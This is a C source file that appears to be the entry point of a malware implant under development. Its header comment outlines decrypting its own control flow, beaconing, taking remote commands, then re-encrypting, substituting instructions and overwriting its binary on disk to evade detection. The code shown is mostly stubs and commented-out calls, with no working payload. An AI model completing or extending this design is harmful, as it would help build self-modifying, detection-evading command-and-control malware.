/*
func do_random_stuff_1
func do_random_stuff_2
func do_random_stuff_3
func do_random_stuff 4
func do_random_stuff 5

func main
	decrypt_control_flow
	beacon

	loop parse_incoming_command
	loop keep_alive
	loop check_for_exit_state

	encrypt_control_flow
	instruction_substitutor
	overwrite_disk_binary
*/

#include <stdio.h>
#include <stdlib.h>
#include "control_flow_handler.h"
#include "cryptor.h"
#include "../data/adjacency_table.h"

int main() {
    //printf("Decrypt all functions\n"); //location might change to control_flow_handler
    //decrypt_function(node, sizeof(node));

	printf("Checking current Handle:\n");
	//printSectionHeaders();

	printf("Checking Nodes:\n");
	size_t functionCount = 9;
	analyzeExecutable(&functionCount);

    printf("Executing graph from Node 0 with max depth of 3:\n");
    //execute_graph(0, 2, 0, adj_table);

    return 0;
}